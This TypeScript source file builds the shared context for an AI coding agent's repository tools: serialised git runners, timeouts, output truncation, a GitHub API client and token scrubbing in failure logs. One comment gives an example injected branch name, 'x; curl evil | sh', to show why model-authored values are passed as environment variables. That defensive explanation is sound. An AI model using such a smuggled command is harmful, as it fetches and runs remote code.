import { DEFAULT_ALLOWED_HOSTS, parseRepo, repoLocation } from "./url.js";
import type {
  RepoCheckout,
  RepoConfig,
  RepoExec,
  RepoGitResult
} from "./index.js";

/**
 * The machinery every repo tool closes over: the resolved config, the git
 * runners, and the forge client.
 */

const DEFAULT_WORKDIR = "/workspace";
const DEFAULT_API_BASE = "https://api.github.com";
const DEFAULT_AUTHOR = {
  name: "da-coder",
  email: "coder@dynamicagents.invalid"
};
const DEFAULT_MAX_OUTPUT_CHARS = 16_000;
/**
 * Ceiling on every call this plugin makes to the forge's API.
 *
 * Not configurable, because it is not a tuning knob: it exists so an API that
 * stops answering costs a round rather than the task. These are single small
 * requests, and thirty seconds is already generous for one.
 */
const FORGE_TIMEOUT_MS = 30_000;
/**
 * How many items one forge list call asks for. GitHub's maximum, and its default
 * without this is 30.
 *
 * One page, never a Link-header walk: an unbounded fetch loop does not belong
 * inside a model turn, and the render is bounded by `maxOutputChars` anyway. What
 * matters is that a full page is *reported* as possibly partial rather than
 * presented as the whole answer — a pull request's newest review comments are on
 * the last page, and those are exactly the ones an agent was sent to act on.
 */
export const FORGE_PAGE_SIZE = 100;

/**
 * Where GraphQL lives, given where REST does.
 *
 * On github.com they share an origin and `/graphql` hangs off it. On GitHub
 * Enterprise — which {@link RepoConfig.apiBase} exists for — REST is under
 * `/api/v3` and GraphQL is its **sibling** at `/api/graphql`, not a path beneath
 * it. Appending blindly yields `/api/v3/graphql`, which is a 404 on every
 * Enterprise install and no failure at all on the public API, so the mistake
 * survives every test written against github.com.
 */
export function graphqlEndpoint(apiBase: string): string {
  const trimmed = apiBase.replace(/\/+$/, "");
  const enterprise = trimmed.replace(/\/api\/v3$/, "/api/graphql");
  return enterprise === trimmed ? `${trimmed}/graphql` : enterprise;
}

/**
 * Middle-out truncation, so both the head of a diff and its tail survive.
 *
 * Deliberately a **copy** of the computer plugin's function of the same name,
 * not an import. `npm run verify:exports` fails any subpath whose module graph
 * reaches a sibling's directory, and its own advice for a shared helper is to
 * duplicate it — installing `repo` must not drag `computer` (and therefore
 * `@cloudflare/computer`) into a consumer's bundle. Fifteen lines is a cheaper
 * price than that coupling, and it is the same reason `exec` is injected here
 * rather than imported.
 *
 * The `half < 1` guard is not padding: without it a small `max` makes `half`
 * zero or negative, and `slice(-0)` is `slice(0)` — the whole string — so the
 * function would return *more* than it was given.
 */
export function truncateOutput(text: string, max: number): string {
  if (text.length <= max) return text;

  const marker = (dropped: number) =>
    `\n\n… [${dropped} characters omitted from the middle] …\n\n`;

  const half = Math.floor((max - marker(text.length).length) / 2);
  if (half < 1) return text.slice(0, Math.max(0, max));

  return (
    text.slice(0, half) + marker(text.length - half * 2) + text.slice(-half)
  );
}

/**
 * What one container command produced — plus one bit the container did not.
 *
 * `exec` does not only *return* failures, it throws them: `@cloudflare/computer`
 * throws `EEXEC_LOST` when a container is replaced mid-command, and any call to a
 * Durable Object can fail outright. Both are caught at the seam
 * ({@link repoContext}'s `run`) and turned into a failed result, so every tool
 * answers in its own `!success` branch — "could not read the status of /w/r: …"
 * is a better sentence than any wrapper one level up could write, and a seventh
 * tool calling `plain` gets it without being told.
 *
 * `unreachable` is for the branches that must tell the two apart. A command that
 * ran and failed has answered the question it was asked; a command that never ran
 * has answered nothing, and three places here read a failure as an answer.
 */
export type RunResult = Awaited<ReturnType<RepoExec>> & { unreachable?: true };

/**
 * What to tell the model when the plumbing, not the command, is the problem.
 *
 * A sibling of the computer plugin's `execLostNote` rather than an import, for
 * the same reason {@link truncateOutput} is a copy: `verify:exports` fails any
 * subpath whose module graph reaches a sibling's, and installing `repo` must
 * not drag `computer` in behind it. The wording differs anyway, and the
 * difference is the point — that plugin cannot know the lost command was git,
 * and this one does. What a model needs after a lost `git push` is not "re-run
 * it" but whether re-running it is *safe*.
 */
function unreachableNote(err: unknown): string {
  if ((err as { code?: unknown } | null | undefined)?.code === "EEXEC_LOST") {
    return (
      "the container was replaced while this command was running, so nothing here " +
      "is known to have finished. This is infrastructure — not git, and not what " +
      "you asked for. The checkout is durable and is exactly as you left it. " +
      "Retry, and read what the retry says rather than assuming it starts from " +
      "nothing: a command that had already reached the forge may have taken " +
      "effect. Retrying is safe either way — these commands push one branch to " +
      "the branch of the same name, and never force."
    );
  }
  return (
    `the command could not be run: ${String(err)}. This is the plumbing — the ` +
    `container, the transport to it, or the host's own configuration — rather ` +
    `than git or anything you passed, and nothing is known to have completed. ` +
    `Retry once; if it happens again, say so in your result rather than working ` +
    `around it.`
  );
}

/**
 * One git command at a time, per plugin instance.
 *
 * Git takes `.git/index.lock` for anything that writes and fails outright rather
 * than waiting if it is already held. A model may emit several tool calls in one
 * turn and the SDK runs them concurrently, so unserialised a `repo_commit` and a
 * `repo_push` race: the commit fails, the push succeeds against the previous
 * state, and the round reports work that never landed.
 *
 * Held here rather than in {@link repoContext}'s closure, because that closure
 * is too short-lived to be the boundary. Core rebuilds `mainAgentTools` every
 * turn and gives each subagent execution its own tool family, so a per-call queue
 * leaves a subagent racing its parent over one checkout — the same collision, one
 * level up. The config object is the plugin instance, and a `WeakMap` means a
 * discarded agent takes its queue with it.
 *
 * A promise chain rather than a lock, because that is all the scope needs: one
 * isolate, one container. Reads are serialised too — `git status` does not take
 * the lock, but ordering costs nothing at these durations and removes having to
 * be right about which commands write.
 *
 * ## The unit is a command, not a tool call
 *
 * Worth stating exactly, because the name suggests more. What is guaranteed is
 * that no two git commands run at once, which is what `.git/index.lock` needs.
 * What is *not* guaranteed is that one tool's sequence is atomic: `repo_push`
 * issues nine commands and `repo_commit` two, and another tool's command can be
 * dequeued between any of them. The shape to watch for is a branch switch landing
 * inside another tool's work —
 *
 *     repo_commit: git add -A
 *     repo_push:   git checkout -b coder/x    ← interleaves here
 *     repo_commit: git commit -m "…"          ← lands on coder/x
 *
 * — because the checked-out branch is state the whole checkout shares, so only
 * concurrent *mutating* tools can disturb it. Both calls report success.
 *
 * Accepted rather than closed, because reaching it takes two repo tool calls in
 * flight against one checkout from one agent, and that is not how the coder
 * drives them. If it is ever observed, the fix is to take the lock once around
 * each tool body instead of around each command — which means the runners below
 * must stop taking it themselves, since a nested take on a promise chain waits
 * on a tail its own caller is still holding.
 */
const gitQueues = new WeakMap<RepoConfig, { tail: Promise<unknown> }>();

/**
 * How long one command may hold its checkout's queue.
 *
 * A command whose container or host never answers — a workspace object that
 * reset under it — would otherwise hold every git command behind it for the life
 * of the isolate, each abandoned in turn at core's per-call limit. Past this the
 * command is reported unreachable and the queue moves on. It may still be
 * running; a later command that meets its `index.lock` fails fast and says so.
 * Under that per-call limit, so the tool answers for itself rather than being
 * abandoned, and far longer than any git command here takes.
 */
const GIT_SLOT_MS = 8 * 60_000;

/** `work`, rejected once {@link GIT_SLOT_MS} passes without it settling. */
function withinSlot<T>(work: Promise<T>): Promise<T> {
  let timer: ReturnType<typeof setTimeout> | undefined;
  const expired = new Promise<never>((_resolve, reject) => {
    timer = setTimeout(
      () =>
        reject(
          new Error(
            `no answer within ${GIT_SLOT_MS / 60_000} minutes, and it may still be running`
          )
        ),
      GIT_SLOT_MS
    );
  });
  // The loser still settles, and a rejection nobody holds fails the request.
  work.catch(() => {});
  return Promise.race([work, expired]).finally(() => clearTimeout(timer));
}

/** What {@link repoContext} hands each group of tools. */
export interface RepoContext {
  config: RepoConfig;
  workdir: string;
  author: { name: string; email: string };
  allowedHosts: string[];
  bounded: (text: string) => string;
  notifyCheckout: (checkout: RepoCheckout) => Promise<void>;
  logFailure: (
    tool: string,
    detail: { exitCode?: number; stderr?: string; stdout?: string }
  ) => void;
  plain: (
    args: string,
    cwd: string,
    vars?: Record<string, string>
  ) => Promise<RunResult>;
  runGit: (op: () => Promise<RepoGitResult>) => Promise<RunResult>;
  fetchOrigin: (dir: string, url: string) => Promise<RunResult>;
  pushBranch: (dir: string, url: string, branch: string) => Promise<RunResult>;
  origin: (dir: string) => Promise<{
    remote?: { host: string; url: string };
    unreachable?: string;
  }>;
  forge: (
    tool: string,
    path: string,
    init?: { method: string; body: unknown }
  ) => Promise<{ ok: true; data: unknown } | { ok: false; message: string }>;
  forgeGraphql: (
    tool: string,
    query: string,
    variables: Record<string, unknown>
  ) => Promise<{ ok: true; data: unknown } | { ok: false; message: string }>;
  forgeRepo: (
    dir: string
  ) => Promise<{ owner: string; repo: string } | { refusal: string }>;
}

export function repoContext(
  config: RepoConfig,
  runtime?: unknown
): RepoContext {
  const workdir = config.workdir ?? DEFAULT_WORKDIR;
  const apiBase = config.apiBase ?? DEFAULT_API_BASE;
  const graphqlUrl = graphqlEndpoint(apiBase);
  const author = config.author ?? DEFAULT_AUTHOR;
  const allowedHosts = config.allowedHosts ?? DEFAULT_ALLOWED_HOSTS;
  const maxChars = config.maxOutputChars ?? DEFAULT_MAX_OUTPUT_CHARS;

  /** Everything this plugin hands back to the model, bounded. */
  const bounded = (text: string) => truncateOutput(text, maxChars);

  /**
   * Tell the host a checkout is ready, and never let that fail the clone.
   *
   * The clone did succeed. Whatever the host wanted to do next — start an
   * install, usually — is its problem to notice, and turning a working
   * `repo_clone` into an error would send the model to investigate git when
   * git is fine.
   */
  const notifyCheckout = async (checkout: RepoCheckout): Promise<void> => {
    if (!config.afterCheckout) return;
    try {
      await config.afterCheckout(checkout);
    } catch (err) {
      console.error("[repo] afterCheckout failed", {
        dir: checkout.dir,
        repo: checkout.repo,
        err: String(err)
      });
    }
  };

  /**
   * The forge credential, or the reason there is none.
   *
   * `config.token` is the host's thunk, and an unresolvable secret throws at the
   * moment of use rather than at startup. Every caller here has a sentence to
   * return, so a throw becomes a value: the one place that must never throw is
   * {@link logFailure}, which runs on the path where an unreadable token is a
   * likely reason to be there at all.
   */
  const credential = (): { token: string } | { failure: string } => {
    try {
      return { token: config.token() };
    } catch (err) {
      return {
        failure:
          `the forge credential could not be read: ${String(err)}. That is the ` +
          `host's configuration rather than anything you passed — report it ` +
          `rather than working around it.`
      };
    }
  };

  /**
   * Say out loud that a git command failed.
   *
   * A failure path that returns its stderr only to the model is one audience
   * short: a `git push` exiting 128 leaves nothing behind but an `exec` line and
   * a truncated command, and proving whether the branch landed then means asking
   * the GitHub API. One line naming the tool and carrying the stderr answers it
   * directly.
   *
   * At `error`, because `--level error` is what an operator narrows to once a
   * task has gone wrong and this is a thing that went wrong. A `warn` sits
   * outside that filter, which leaves a failed clone invisible to the first pass
   * of an investigation and findable only by timestamp.
   *
   * The token is scrubbed rather than trusted. It has no route into a container
   * command, and the one channel that could carry it is the forge API's error
   * body, which {@link forge} logs through this same function. So stderr *should*
   * be clean — but "should be" is not the standard for something that writes a
   * credential into a log that outlives the request, and the scrub costs a
   * `split`/`join` on a path that already failed.
   */
  const logFailure = (
    tool: string,
    detail: { exitCode?: number; stderr?: string; stdout?: string }
  ): void => {
    // Nothing to scrub is not a problem: the log is written either way, and
    // what it carries is whatever the command produced.
    const secret = credential();
    const token = "token" in secret ? secret.token : "";
    const scrub = (text: string | undefined) =>
      token && text ? text.split(token).join("«token»") : text;
    console.error(`[repo] ${tool} failed`, {
      exitCode: detail.exitCode,
      stderr: truncateOutput(scrub(detail.stderr) ?? "", 2_000),
      stdout: truncateOutput(scrub(detail.stdout) ?? "", 2_000)
    });
  };

  // Keyed on the config object, which is what identifies the plugin instance:
  // `repo(config)` closes over exactly one and hands the same one to every build.
  const queue = gitQueues.get(config) ?? { tail: Promise.resolve() };
  gitQueues.set(config, queue);
  const serialised = <T>(run: () => Promise<T>): Promise<T> => {
    // `then(run, run)` so one failure does not wedge every command behind it —
    // the queue is for ordering, not for propagating outcomes.
    const next = queue.tail.then(run, run);
    queue.tail = next.then(
      () => undefined,
      () => undefined
    );
    return next;
  };

  /**
   * Every container command this plugin runs, and the only place `exec` is
   * allowed to throw.
   *
   * `options` is a thunk rather than a value so that everything it reads — the
   * token above all — is read here, inside the `try` and at the moment the queue
   * actually dequeues this command. Building it at the call site would put a
   * rotated secret's lookup, and any throw from it, outside the one handler.
   */
  const run = (
    command: string,
    options: () => Parameters<RepoExec>[1]
  ): Promise<RunResult> =>
    serialised(async () => {
      try {
        return await withinSlot(config.exec(command, options()));
      } catch (err) {
        // Logged here as well as by the tool's own failure branch: the two say
        // different things, and this is the one that names the command. The
        // command string is safe to log — that it never carries the token is the
        // invariant this whole file is built on, and it has a test.
        console.warn("[repo] command could not run", {
          command: truncateOutput(command, 500),
          err: String(err)
        });
        return {
          success: false,
          stdout: "",
          stderr: unreachableNote(err),
          exitCode: -1,
          unreachable: true
        };
      }
    });

  /**
   * A container command with no secret in its environment.
   *
   * `vars` carries every **model-controlled** value — a branch name, a commit
   * message — into the container as an environment variable, referenced inside
   * the command as `"$VAR"`. Interpolating them into the command string instead
   * would let a model-authored branch name of `x; curl evil | sh` run as a
   * second command. The container is isolated and the blast radius is its own
   * filesystem, but "the container contains it" is a reason to be careful here,
   * not a reason to skip it.
   *
   * `GIT_TERMINAL_PROMPT=0` is passed on every command rather than left to the
   * image: a command inherits only a small allowlist from the daemon, so a
   * variable that is not passed here does not reach git at all — and one that
   * does not reach git is a prompt nobody can answer, on a terminal that does
   * not exist.
   */
  const shell = (
    script: string,
    cwd: string,
    vars: Record<string, string> = {}
  ) =>
    run(script, () => ({
      cwd,
      runtime,
      env: { GIT_TERMINAL_PROMPT: "0", ...vars }
    }));

  const plain = (
    args: string,
    cwd: string,
    vars: Record<string, string> = {}
  ) => shell(`git ${args}`, cwd, vars);

  /**
   * Run one credentialed operation, on the host's side of the boundary.
   *
   * The sibling of {@link run}, for the same reason: every tool below already
   * has a `!success` branch that says what it was doing at the time. What differs
   * is where a failure can come from.
   *
   * {@link RepoGit} reports a *git* failure as data — a rejected push, a branch
   * that does not resolve — so that becomes an ordinary unsuccessful result. A
   * throw means the host could not be reached at all, which is the `unreachable`
   * case: nothing ran, and three places in this file read that differently from
   * an answer.
   *
   * Serialised with the container commands rather than merely alongside them. A
   * fetch writes refs into the same checkout a `git status` is reading, and the
   * two interleaving is exactly the race `serialised` exists to prevent — the
   * fact that one of them now runs somewhere else does not change that they
   * share a filesystem.
   */
  const runGit = (op: () => Promise<RepoGitResult>): Promise<RunResult> =>
    serialised(async () => {
      try {
        const result = await withinSlot(op());
        return result.ok
          ? { success: true, stdout: result.detail, stderr: "", exitCode: 0 }
          : { success: false, stdout: "", stderr: result.message, exitCode: 1 };
      } catch (err) {
        // Logged here as well as by the tool's own failure branch, the same way
        // `run` does it: this is the line that names the operation as git's
        // rather than the container's, which is the first thing worth knowing.
        console.warn("[repo] a credentialed git operation could not run", {
          err: String(err)
        });
        return {
          success: false,
          stdout: "",
          stderr: unreachableNote(err),
          exitCode: -1,
          unreachable: true
        };
      }
    });

  /**
   * Update the checkout's remote-tracking refs.
   *
   * The allowlist travels with the call rather than being checked once here,
   * because the host is where the token actually is: it can bind the check to
   * the moment the credential would be handed over, which catches a host reached
   * by redirect as well as one named in the URL.
   */
  const fetchOrigin = (dir: string, url: string) =>
    runGit(() => config.git.fetch({ url, dir, allowedHosts }));

  /** Push one branch to the same-named branch on the remote. Never forced. */
  const pushBranch = (dir: string, url: string, branch: string) =>
    runGit(() => config.git.push({ url, dir, branch, allowedHosts }));

  /**
   * One call to the forge's API, from the Worker.
   *
   * Every tool here that talks to the forge goes through this, so the credential
   * stays on the Worker's side of the boundary and the bound, the header set and
   * the refusal to let an unreadable body replace an explanatory status are
   * written once.
   *
   * A failure comes back as a value rather than a throw, because each caller has
   * its own sentence to add: a POST whose answer never arrived may have been
   * received, which a GET has no reason to warn about.
   */
  const forge = (
    tool: string,
    path: string,
    init?: { method: string; body: unknown }
  ) => forgeAt(tool, `${apiBase}${path}`, init);

  /**
   * The same call, against a URL rather than a path under {@link apiBase}.
   *
   * GraphQL needs it: on Enterprise the REST base carries `/api/v3` and GraphQL
   * does not live under it — see {@link graphqlEndpoint}.
   */
  const forgeAt = async (
    tool: string,
    url: string,
    init?: { method: string; body: unknown }
  ): Promise<{ ok: true; data: unknown } | { ok: false; message: string }> => {
    const secret = credential();
    if ("failure" in secret) {
      logFailure(tool, { stderr: secret.failure });
      return { ok: false, message: secret.failure };
    }
    let response: Response;
    try {
      response = await fetch(url, {
        method: init?.method ?? "GET",
        headers: {
          authorization: `Bearer ${secret.token}`,
          accept: "application/vnd.github+json",
          "content-type": "application/json",
          "user-agent": "da-coder"
        },
        ...(init ? { body: JSON.stringify(init.body) } : {}),
        signal: AbortSignal.timeout(FORGE_TIMEOUT_MS)
      });
    } catch (err) {
      logFailure(tool, { stderr: String(err) });
      return { ok: false, message: `could not reach ${url}: ${String(err)}` };
    }
    if (!response.ok) {
      const detail = await response.text().catch(() => "");
      logFailure(tool, { exitCode: response.status, stderr: detail });
      return {
        ok: false,
        message: `${url} answered ${response.status}: ${detail.slice(0, 500)}`
      };
    }
    return { ok: true, data: await response.json().catch(() => ({})) };
  };

  /**
   * One GraphQL query or mutation, over {@link forge} so the credential, the
   * bound, the headers and the scrubbed failure log stay written once.
   *
   * **A failed GraphQL query answers `200`.** The errors are in the body, so
   * `response.ok` means only that the request was understood — a caller reading
   * `data` straight through reports a permission failure, a bad node id or a
   * malformed query as an empty result, which reads to the model as "there is
   * nothing there" and is acted on accordingly. That is the whole reason this
   * wrapper exists rather than each caller posting to `/graphql` itself.
   *
   * What needs it is what REST cannot express: resolving a review thread has no
   * REST equivalent at all, the threads themselves are not on the issue timeline
   * `repo_issue_view` reads, and a review *request* naming an app is invisible to
   * REST — see {@link REVIEW_REQUESTS_QUERY}.
   */
  const forgeGraphql = async (
    tool: string,
    query: string,
    variables: Record<string, unknown>
  ): Promise<{ ok: true; data: unknown } | { ok: false; message: string }> => {
    const answered = await forgeAt(tool, graphqlUrl, {
      method: "POST",
      body: { query, variables }
    });
    if (!answered.ok) return answered;
    const body = answered.data as {
      data?: unknown;
      errors?: { message?: string }[];
    };
    if (body.errors && body.errors.length > 0) {
      const detail = body.errors
        .map((e) => e?.message ?? "unknown error")
        .join("; ");
      logFailure(tool, { stderr: detail });
      return {
        ok: false,
        message: `${graphqlUrl} refused the query: ${detail.slice(0, 500)}`
      };
    }
    return { ok: true, data: body.data };
  };

  /**
   * Which repository the tools that read the forge are talking about.
   *
   * The checkout's own origin, never a URL the model supplies. Three reasons, in
   * order of how much they matter: the origin has already been through the host
   * allowlist, there is nothing new to validate; a model that can name any
   * repository here can read any repository the token can, which is precisely
   * the reach this plugin does not want to widen; and an agent asking about
   * "issue 42" almost always means the repository it is working in, so the extra
   * parameter would mostly be an extra way to be wrong.
   */
  const forgeRepo = async (
    dir: string
  ): Promise<{ owner: string; repo: string } | { refusal: string }> => {
    const { remote, unreachable } = await origin(dir);
    if (unreachable) return { refusal: bounded(unreachable) };
    if (!remote)
      return {
        refusal: `${dir} has no origin on an allowed host — clone it with repo_clone first`
      };
    const parsed = parseRepo(remote.url, allowedHosts);
    if (!parsed)
      return {
        refusal: `could not parse an owner/repo out of ${dir}'s origin`
      };
    return {
      owner: encodeURIComponent(parsed.owner),
      repo: encodeURIComponent(parsed.repo)
    };
  };

  /**
   * The origin a checkout was cloned from, re-derived rather than remembered.
   *
   * `repo_push` needs to know which host to offer the credential to, and the
   * only trustworthy answer is the one recorded in the checkout itself — which
   * `repo_clone` only ever writes after the allowlist has passed.
   */
  const origin = async (
    dir: string
  ): Promise<{
    /** Set when the checkout names an origin on an allowed host. */
    remote?: { host: string; url: string };
    /** Set when git never answered, so "no origin" would be a guess. */
    unreachable?: string;
  }> => {
    const result = await plain("remote get-url origin", dir);
    // Two different nothings. `repo_push`'s answer to "no origin here" is to
    // tell the model to clone the repository first — advice that is actively
    // wrong when the truth is that no command ran at all.
    if (result.unreachable) return { unreachable: result.stderr };
    if (!result.success) return {};
    const url = result.stdout.trim();
    const location = repoLocation(url);
    if (!location || !allowedHosts.includes(location.host)) return {};
    // The URL as well as the host: the credentialed operations run on the
    // host's side of the boundary and take the repository as a parameter, so
    // `origin` is a name that means nothing to them. The URL has to travel —
    // canonicalised, since what git hands back is whatever was written into
    // `.git/config`.
    return { remote: { host: location.host, url: location.url } };
  };

  return {
    config,
    workdir,
    author,
    allowedHosts,
    bounded,
    notifyCheckout,
    logFailure,
    plain,
    runGit,
    fetchOrigin,
    pushBranch,
    origin,
    forge,
    forgeGraphql,
    forgeRepo
  };
}
